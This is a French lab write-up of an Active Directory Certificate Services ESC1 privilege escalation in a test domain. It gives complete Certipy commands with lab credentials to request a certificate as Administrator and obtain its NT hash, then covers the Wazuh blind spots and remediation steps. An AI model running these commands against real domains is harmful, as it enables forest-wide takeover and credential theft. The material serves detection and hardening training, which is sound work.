# ⚔️ Attaque 08 — ADCS ESC1 (Certificat de complaisance)

| | |
|---|---|
| **Catégorie** | Privilege Escalation |
| **MITRE ATT&CK** | [T1649](https://attack.mitre.org/techniques/T1649/) |
| **Fiche théorique** | [`../../docs/04-privilege-escalation/25-adcs-abuse.md`](../../docs/04-privilege-escalation/25-adcs-abuse.md) |
| **Cible** | `sevenkingdoms.local` — CA **SEVENKINGDOMS-CA** (kingslanding · 192.168.56.10) |
| **Compte attaquant** | `tywin.lannister` (**simple Domain User**) |
| **Outil** | `Certipy` (find / req / auth) |
| **Statut détection Wazuh** | 🔴 Angle mort **critique** (audit ADCS + Kerberos désactivés) |

---

## 1. 🧠 Description

> **Le concept en une phrase :** une autorité de certification mal configurée permet à n'importe quel utilisateur du domaine de demander un certificat *au nom de n'importe qui d'autre* — ce qui revient à usurper l'identité de l'Administrator.

**ADCS** (Active Directory Certificate Services) est l'**autorité de certification** interne de l'entreprise. Dans AD, un **certificat peut servir à s'authentifier** (mécanisme **PKINIT**) : détenir un certificat au nom de quelqu'un équivaut à **pouvoir devenir cette personne**.

Un certificat est émis selon un **modèle** (template). Ce modèle est **vulnérable ESC1** quand il cumule trois conditions :

| Condition | Signification |
|-----------|--------------|
| `Enrollee Supplies Subject = True` | **c'est le demandeur qui choisit le nom** inscrit dans le certificat 🚨 |
| `Client Authentication = True` | le certificat peut servir à s'authentifier dans le domaine |
| `Enrollment Rights : Domain Users` | **n'importe quel utilisateur** peut en demander un |

**Le combo mortel :** avec un compte lambda, l'attaquant demande un certificat en indiquant *« émets-le au nom d'`Administrator` »* — la CA accepte sans vérifier, et ce certificat permet de s'authentifier **en tant qu'Administrator**. Sans mot de passe, sans exploit, juste une CA mal configurée.

## 2. 🎯 Prérequis

- Un **simple compte de domaine** avec droit d'enrôlement (ici `tywin.lannister`, Domain User).
- Une CA exposant un modèle **vulnérable ESC1**.

## 3. 💻 Exécution

### Étape 1 — Trouver les modèles vulnérables

```bash
certipy find -u tywin.lannister@sevenkingdoms.local -p powerkingftw135 -dc-ip 192.168.56.10 -vulnerable -stdout
```

→ révèle le modèle **`ESC1`** sur **`SEVENKINGDOMS-CA`** : `Enrollee Supplies Subject = True`, `Client Authentication = True`, `Requires Manager Approval = False`, enrôlable par `Domain Users`.

![Certipy trouve le modèle vulnérable ESC1](../screenshots/attacks/attack-08-adcs-find.png)

### Étape 2 — Demander un certificat au nom d'`Administrator`

```bash
certipy req -u tywin.lannister@sevenkingdoms.local -p powerkingftw135 -dc-ip 192.168.56.10 \
  -ca SEVENKINGDOMS-CA -template ESC1 -upn administrator@sevenkingdoms.local
```

→ la CA émet le certificat et Certipy le sauvegarde dans **`administrator.pfx`**.

![Demande du certificat au nom de l'Administrator](../screenshots/attacks/attack-08-adcs-req.png)

### Étape 3 — S'authentifier avec le certificat (PKINIT)

```bash
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
```

→ le DC valide le certificat, délivre un **TGT** et Certipy récupère le **hash NT** de l'Administrator.

![PKINIT : TGT et hash NT de l'Administrator récupérés](../screenshots/attacks/attack-08-adcs-auth.png)

## 4. 📤 Résultat

Depuis un **simple Domain User**, on obtient le **TGT + le hash NT** de `Administrator@sevenkingdoms.local` — soit l'**Administrator du domaine racine = Enterprise Admin sur toute la forêt** 👑. **Aucun mot de passe cracké**, juste une CA mal configurée. Ce hash ouvre ensuite DCSync, Pass-the-Hash, etc.

## 5. 🛡️ Détection dans Wazuh — 🔴 angle mort critique

| Recherche (DQL) | Résultat | Lecture |
|---|---|---|
| `data.win.system.eventID:4886 or ...:4887` | **0 hit** | audit **ADCS non activé** → demande/émission de certificat invisible |
| `data.win.system.eventID:4768` | **0 hit** | audit **Kerberos désactivé** → l'auth PKINIT ne laisse aucune trace |
| `agent.name:DC01` (la CA) | **114 hits** | la CA remonte des logs, mais **que du bruit** (4624/4634), rien sur l'attaque |

**Events Windows concernés :** `4886` (demande de certif) / `4887` (émission) / `4768` (TGT PKINIT) — **tous absents**.

![Aucune trace de la demande de certificat (4886/4887)](../screenshots/attacks/attack-08-adcs-wazuh.png)

![Aucune trace de l'auth PKINIT (4768)](../screenshots/attacks/attack-08-adcs-wazuh-4768.png)

![114 événements kingslanding, aucun lié à l'attaque ADCS](../screenshots/attacks/attack-08-adcs-wazuh-dc01.png)

## 6. 🎓 Analyse & leçon

> **L'attaque la plus puissante est la plus silencieuse.** La forêt entière est compromise (Domain User → Enterprise Admin), et le SIEM par défaut n'affiche **rien** : ni la demande de certificat frauduleuse (4886/4887 non audités), ni l'authentification par certificat (4768 non audité). C'est **encore plus grave que DCSync** — aucune trace exploitable par défaut.

**Ce qu'il faut retenir :**
- ADCS est souvent oublié dans les évaluations de sécurité — c'est une surface d'attaque massive.
- Deux audits manquants suffisent à rendre l'attaque invisible : l'audit ADCS (4886/4887) et l'audit Kerberos (4768).
- La règle `100012` (Phase 5) permet de détecter l'émission de certificats au nom d'un autre utilisateur une fois ces audits activés.

## 7. 🔧 Remédiation

- **Corriger le modèle** : désactiver *Enrollee Supplies Subject*, ou exiger *Manager Approval*, ou restreindre les droits d'enrôlement.
- **Activer l'audit ADCS** sur la CA (events **4886/4887**) et l'**audit Kerberos** (**4768** avec info certificat).
- Surveiller les certificats dont le **SAN/UPN ≠ demandeur** (indice direct d'ESC1).
- Appliquer le durcissement Microsoft (KB5014754 : mapping fort certificat↔compte).

---

⬅️ Retour à l'[index des attaques](../03-attaques.md)
